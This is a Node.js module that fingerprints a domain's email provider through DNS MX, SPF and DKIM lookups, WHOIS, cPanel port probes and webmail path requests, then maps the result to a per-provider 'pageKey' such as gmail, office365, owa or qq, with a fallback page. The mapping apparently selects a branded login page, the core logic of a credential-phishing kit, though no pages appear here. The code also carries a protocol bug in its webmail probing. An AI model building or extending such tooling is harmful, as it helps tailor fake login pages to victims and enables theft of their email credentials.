const dns = require("dns").promises;
const net = require("net");
const https = require("https");
const http = require("http");
const whois = require("whois-json");

const cache = new Map();
const TTL_MS = 5 * 60 * 1000;

function setCache(domain, data) {
  cache.set(domain, { data, expires: Date.now() + TTL_MS });
}

function getCache(domain) {
  const cached = cache.get(domain);
  if (!cached || Date.now() > cached.expires) {
    cache.delete(domain);
    return null;
  }
  return cached.data;
}

// ✅ Your custom platform-to-page map
const platformToPageKey = {
  "126": "126",
  "163": "163",
  aol: "aol",
  aruba: "aruba",
  "fallback-page": "fallback-page",
  general: "general",
  google: "gmail",
  gmx: "gmx",
  hotmail: "hotmail",
  icewarp: "icewarp",
  libero: "libero",
  office365: "office365",
  qq: "qq",
  roundcube: "roundcube",
  sina: "sina",
  smartermail: "smartermail",
  yahoo: "yahoo",
  yandex: "yandex",
  zimbra: "zimbra",
  zoho: "zoho",
  owa: "owa" // ✅ Exchange autodiscover → OWA page
};

// ✅ Keywords to match DNS/MX/SPF/DKIM/WHOIS
const knownPlatforms = {
  "126": ["126.com", "mx.126.com", "_spf.126.com"],
  "163": ["163.com", "mx.163.com", "_spf.163.com"],
  aol: ["aol.com", "mx.aol.com", "mx.aol.mail.gm0.yahoodns.net", "_spf.aol.com"],
  aruba: ["aruba.it", "mx.aruba.it", "smtp.secureserver.net", "_spf.aruba.it"],
  google: ["gmail.com", "google.com", "aspmx.l.google.com", "alt1.aspmx.l.google.com", "_spf.google.com"],
  gmx: ["gmx.net", "gmx.com", "mx00.gmx.net", "mx01.gmx.net", "_spf.gmx.net"],
  outlook: ["hotmail.com", "outlook.com", "live.com", "office365.com", "protection.outlook.com", "_spf.protection.outlook.com"],
  icewarp: ["icewarp.com", "icewarpcloud.com", "mx.icewarp.com", "_spf.icewarp.com"],
  libero: ["libero.it", "mx.libero.it", "_spf.libero.it"],
  office365: ["office365.com", "outlook.com", "protection.outlook.com", "microsoft.com", "_spf.protection.outlook.com"],
  qq: ["qq.com", "mx.qq.com", "_spf.qq.com"],
  roundcube: ["roundcube.net", "webmail", "mail", "smtp"],
  sina: ["sina.com", "sina.cn", "mx.sina.com.cn", "_spf.sina.com"],
  smartermail: ["smartermail.com", "smartertools.com", "mx.smartermail.com", "_spf.smartermail.com"],
  yahoo: ["yahoo.com", "yahoodns.net", "mx.mail.yahoo.com", "_spf.mail.yahoo.com"],
  yandex: ["yandex.ru", "yandex.net", "mx.yandex.net", "_spf.yandex.net"],
  zimbra: ["zimbra.com", "zimbra.mail", "mx.zimbra.com"],
  zoho: ["zoho.com", "mx.zoho.com", "zoho.eu", "_spf.zoho.com"],

  // ✅ autodiscover Exchange/Outlook → force to OWA
  owa: ["exchange", "outlook", "autodiscover", "office365"],

  // generic/fallbacks
  cpanel: ["cpanel", "webmail", "secureserver.net", "mail.[domain]", "smtp.secureserver.net"],
  general: ["mail.[domain]", "mx.[domain]", "smtp.[domain]"],
  "fallback-page": []
};

// 🔌 Port probing
function probePort(domain, port, timeout = 3000) {
  return new Promise((resolve) => {
    const socket = net.createConnection({ host: domain, port, timeout });
    socket.on("connect", () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => {
      socket.destroy();
      resolve(false);
    });
  });
}

// 🌐 Webmail endpoint probing (includes SmarterMail rule)
function probeWebmail(domain) {
  const paths = [
    "/webmail",
    "/roundcube",
    "/horde",
    "/mail",
    "/interface/root#/login" // ✅ SmarterMail login
  ];
  const protocols = [https, http];

  return Promise.any(
    protocols.flatMap((proto) =>
      paths.map((path) =>
        new Promise((resolve, reject) => {
          const req = proto.get(`http://${domain}${path}`, (res) => {
            if (res.statusCode === 200) {
              if (path.includes("interface/root#/login")) {
                resolve("smartermail"); // ✅ tag as smartermail
              } else {
                resolve(path);
              }
            } else {
              reject();
            }
          });
          req.on("error", reject);
          req.setTimeout(3000, () => req.destroy());
        })
      )
    )
  ).catch(() => null);
}

// 🔍 WHOIS heuristic
async function getWhoisPlatform(domain) {
  try {
    const whoisData = await whois(domain);
    const raw = JSON.stringify(whoisData).toLowerCase();

    for (const [platform, indicators] of Object.entries(knownPlatforms)) {
      if (indicators.some((keyword) => raw.includes(keyword))) {
        return platform;
      }
    }
  } catch (err) {
    console.warn("WHOIS lookup failed:", err.message);
  }
  return null;
}

// 🔍 Autodiscover SRV detection (Exchange/Outlook)
async function checkAutodiscover(domain) {
  try {
    const srv = await dns.resolveSrv(`_autodiscover._tcp.${domain}`);
    if (srv && srv.length > 0) {
      const target = srv[0].name.toLowerCase();
      if (target.includes("outlook") || target.includes("exchange") || target.includes("office365")) {
        return "owa"; // ✅ autodiscover → Exchange OWA
      }
    }
  } catch {
    // no SRV
  }
  return null;
}

async function detectPlatform(domain) {
  const cachedResult = getCache(domain);
  if (cachedResult) return cachedResult;

  const result = {
    platform: "fallback-page", // ✅ default instead of "unknown"
    mxHosts: [],
    spfTxts: [],
    dkimSelectors: [],
    webmailPath: null,
    whoisMatch: null,
    error: null
  };

  try {
    // MX Records
    const mxRecords = await dns.resolveMx(domain);
    result.mxHosts = mxRecords.map((r) => r.exchange.toLowerCase());

    // SPF
    const txtRecords = await dns.resolveTxt(domain);
    result.spfTxts = txtRecords.flat().filter((txt) => txt.includes("v=spf1"));

    // DKIM
    const commonSelectors = ["default", "selector1", "selector2"];
    for (const selector of commonSelectors) {
      try {
        const dkimTxt = await dns.resolveTxt(`${selector}._domainkey.${domain}`);
        result.dkimSelectors.push({ selector, record: dkimTxt.flat().join("") });
      } catch {
        // ignore
      }
    }

    // Match keywords
    const allValues = [
      ...result.mxHosts,
      ...result.spfTxts,
      ...result.dkimSelectors.map((d) => d.record)
    ].join(" ").toLowerCase();

    for (const [platform, keywords] of Object.entries(knownPlatforms)) {
      if (keywords.some((keyword) => allValues.includes(keyword))) {
        result.platform = platform;
        break;
      }
    }

    // Probe for cPanel ports
    const isCpanel = (await probePort(domain, 2095)) || (await probePort(domain, 2096));
    if (isCpanel) result.platform = "cpanel";

    // Probe for webmail/smartermail
    const webmailPath = await probeWebmail(domain);
    if (webmailPath) {
      result.webmailPath = webmailPath;
      if (webmailPath === "smartermail") {
        result.platform = "smartermail";
      } else if (webmailPath.includes("roundcube")) {
        result.platform = "roundcube";
      } else if (webmailPath.includes("horde")) {
        result.platform = "horde";
      }
    }

    // WHOIS fallback
    const whoisMatch = await getWhoisPlatform(domain);
    if (whoisMatch && result.platform === "fallback-page") {
      result.platform = whoisMatch;
      result.whoisMatch = whoisMatch;
    }

    // 🔍 Autodiscover SRV fallback
    if (result.platform === "fallback-page") {
      const autodiscoverMatch = await checkAutodiscover(domain);
      if (autodiscoverMatch) {
        result.platform = autodiscoverMatch;
      }
    }

    setCache(domain, result);
  } catch (err) {
    result.error = "DNS resolution failed";
    console.error("DNS error for domain:", domain, err);
  }

  result.pageKey = platformToPageKey[result.platform] || "fallback-page"; // ✅ ensure fallback

  // 📜 Logging
  console.log("🔎 Detection Result:", {
    domain,
    platform: result.platform,
    pageKey: result.pageKey,
    mx: result.mxHosts,
    spf: result.spfTxts,
    dkim: result.dkimSelectors,
    webmail: result.webmailPath,
    whois: result.whoisMatch
  });

  return result;
}

const scoringWeights = { mx: 3, spf: 2, dkim: 1 };

function scorePlatforms(mxHosts, spfRecords, dkimRecords) {
  const scores = {};

  for (const [platform, indicators] of Object.entries(knownPlatforms)) {
    scores[platform] = 0;
    const allIndicators = indicators.map((s) => s.toLowerCase());

    mxHosts.forEach((mx) => {
      if (allIndicators.some((i) => mx.includes(i))) scores[platform] += scoringWeights.mx;
    });
    spfRecords.forEach((spf) => {
      if (allIndicators.some((i) => spf.includes(i))) scores[platform] += scoringWeights.spf;
    });
    dkimRecords.forEach((dkim) => {
      if (allIndicators.some((i) => dkim.includes(i))) scores[platform] += scoringWeights.dkim;
    });
  }

  const highestScore = Math.max(...Object.values(scores));
  const topPlatforms = Object.entries(scores)
    .filter(([_, score]) => score === highestScore)
    .map(([platform]) => platform);

  return { topPlatforms, scores };
}

module.exports = { detectPlatform, scorePlatforms };
